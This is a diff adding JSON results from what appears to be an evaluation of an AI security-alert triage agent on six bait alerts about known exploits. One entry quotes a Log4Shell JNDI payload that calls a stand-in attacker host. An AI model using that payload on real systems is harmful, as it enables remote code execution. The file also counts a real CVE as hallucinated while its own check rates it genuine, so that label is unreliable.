@@ -1,0 +1,120 @@
+{
+  "total_tested": 6,
+  "ungrounded_count": 1,
+  "ungrounded_rate": 0.16666666666666666,
+  "requires_review_count": 0,
+  "requires_review_rate": 0.0,
+  "results": [
+    {
+      "alert_id": "BAIT-001",
+      "severity_assessment": "CRITICAL",
+      "threat_summary": "A critical remote command execution (RCE) attempt has been detected on an Apache Struts 2 server, exploiting a known OGNL injection vulnerability.",
+      "threat_type": "Remote Command Execution (RCE)",
+      "recommended_action": "Immediately isolate the affected server, update Apache Struts 2 to the latest version, and conduct a thorough vulnerability assessment.",
+      "confidence_score": 0.95,
+      "reasoning": "The presence of a crafted Content-Type header and a matching OGNL injection technique, as seen in high-profile breaches, strongly indicates a targeted RCE attack.",
+      "processed_at": "2026-07-26T10:38:44.178454",
+      "model": "llama-3.1-8b-instant",
+      "agent_version": "guardrail-v0.4",
+      "guardrail_blocked": false,
+      "hallucinated_cves": [],
+      "cve_verifications": [],
+      "output_guardrail_flagged": false,
+      "requires_review": false
+    },
+    {
+      "alert_id": "BAIT-002",
+      "severity_assessment": "CRITICAL",
+      "threat_summary": "A critical threat has been detected involving a potential remote code execution vulnerability in a Java logging library, with a malicious JNDI lookup string detected in application logs.",
+      "threat_type": "Remote Code Execution (RCE)",
+      "recommended_action": "Immediately investigate the source IP 203.0.113.11 and block it from accessing the destination IP 10.0.0.51, and review the application's logging configuration to prevent similar exploits.",
+      "confidence_score": 0.95,
+      "reasoning": "The presence of a JNDI lookup string in the application log fields, consistent with a widely publicized Java logging library RCE vulnerability from December 2021, indicates a high likelihood of a successful exploit.",
+      "processed_at": "2026-07-26T10:38:44.575942",
+      "model": "llama-3.1-8b-instant",
+      "agent_version": "guardrail-v0.4",
+      "guardrail_blocked": false,
+      "hallucinated_cves": [],
+      "cve_verifications": [],
+      "output_guardrail_flagged": false,
+      "requires_review": false
+    },
+    {
+      "alert_id": "BAIT-003",
+      "severity_assessment": "HIGH",
+      "threat_summary": "A potential buffer over-read vulnerability in the OpenSSL TLS heartbeat extension has been detected, indicating a possible exploitation attempt.",
+      "threat_type": "Buffer Overflow/Over-read",
+      "recommended_action": "Investigate the source IP 203.0.113.12 for potential malicious activity and consider blocking it to prevent further exploitation.",
+      "confidence_score": 0.85,
+      "reasoning": "The detection of an OpenSSL heartbeat extension returning excess memory content beyond the requested payload length is consistent with a well-known 2014 buffer over-read vulnerability in TLS heartbeat handling, suggesting a potential exploitation attempt.",
+      "processed_at": "2026-07-26T10:38:44.874821",
+      "model": "llama-3.1-8b-instant",
+      "agent_version": "guardrail-v0.4",
+      "guardrail_blocked": false,
+      "hallucinated_cves": [],
+      "cve_verifications": [],
+      "output_guardrail_flagged": false,
+      "requires_review": false
+    },
+    {
+      "alert_id": "BAIT-004",
+      "severity_assessment": "CRITICAL",
+      "threat_summary": "A critical vulnerability has been exploited on the Microsoft Exchange server, allowing an attacker to bypass proxy authentication and drop a webshell. This exploit chain is known to target on-premises Exchange deployments.",
+      "threat_type": "Web Server Exploit",
+      "recommended_action": "Immediately isolate the affected server, patch the Microsoft Exchange server with the latest security updates, and conduct a thorough forensic analysis to determine the extent of the attack.",
+      "confidence_score": 0.95,
+      "reasoning": "The presence of a well-known exploit chain targeting on-premises Exchange deployments, combined with the specific protocol and payload details, strongly indicates a successful exploitation of the vulnerability.",
+      "processed_at": "2026-07-26T10:38:45.228111",
+      "model": "llama-3.1-8b-instant",
+      "agent_version": "guardrail-v0.4",
+      "guardrail_blocked": false,
+      "hallucinated_cves": [],
+      "cve_verifications": [],
+      "output_guardrail_flagged": false,
+      "requires_review": false
+    },
+    {
+      "alert_id": "BAIT-005",
+      "severity_assessment": "HIGH",
+      "threat_summary": "A Linux host is experiencing a local privilege escalation due to a kernel vulnerability, allowing an unprivileged user to potentially gain elevated access.",
+      "threat_type": "Privilege Escalation",
+      "recommended_action": "Immediately investigate the affected host, review system logs, and consider rebooting the system to prevent further exploitation.",
+      "confidence_score": 0.95,
+      "reasoning": "The alert indicates a known kernel vulnerability, specifically a race condition in a copy-on-write memory handling routine, which is consistent with the 'cow' vulnerability. The presence of ptrace(PTRACE_POKETEXT) on /proc/self/mem by an unprivileged user further supports this assessment.",
+      "processed_at": "2026-07-26T10:38:45.589427",
+      "model": "llama-3.1-8b-instant",
+      "agent_version": "guardrail-v0.4",
+      "guardrail_blocked": false,
+      "hallucinated_cves": [],
+      "cve_verifications": [],
+      "output_guardrail_flagged": false,
+      "requires_review": false
+    },
+    {
+      "alert_id": "BAIT-006",
+      "severity_assessment": "CRITICAL",
+      "threat_summary": "A critical remote code execution (RCE) attempt has been detected, exploiting the Log4j vulnerability. The attack involves a JNDI lookup string in an application log field, indicating potential malicious activity.",
+      "threat_type": "Remote Code Execution (RCE)",
+      "recommended_action": "Immediately investigate the source IP 203.0.113.15 and block it to prevent further attacks. Review the application logs for any signs of exploitation and update the application to the latest version.",
+      "confidence_score": 0.95,
+      "reasoning": "The presence of a JNDI lookup string in the application log field, specifically ${jndi:ldap://malicious-host.example/a}, is consistent with the exploitation of CVE-2021-44228, the Log4j remote code execution vulnerability disclosed in December 2021. This indicates a high likelihood of a malicious attack.",
+      "processed_at": "2026-07-26T10:38:46.013904",
+      "model": "llama-3.1-8b-instant",
+      "agent_version": "guardrail-v0.4",
+      "guardrail_blocked": false,
+      "hallucinated_cves": [
+        "CVE-2021-44228"
+      ],
+      "cve_verifications": [
+        {
+          "cve_id": "CVE-2021-44228",
+          "classification": "REAL_AND_PLAUSIBLE",
+          "nvd_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
+          "topical_overlap": 0.174
+        }
+      ],
+      "output_guardrail_flagged": true,
+      "requires_review": false
+    }
+  ]
+}
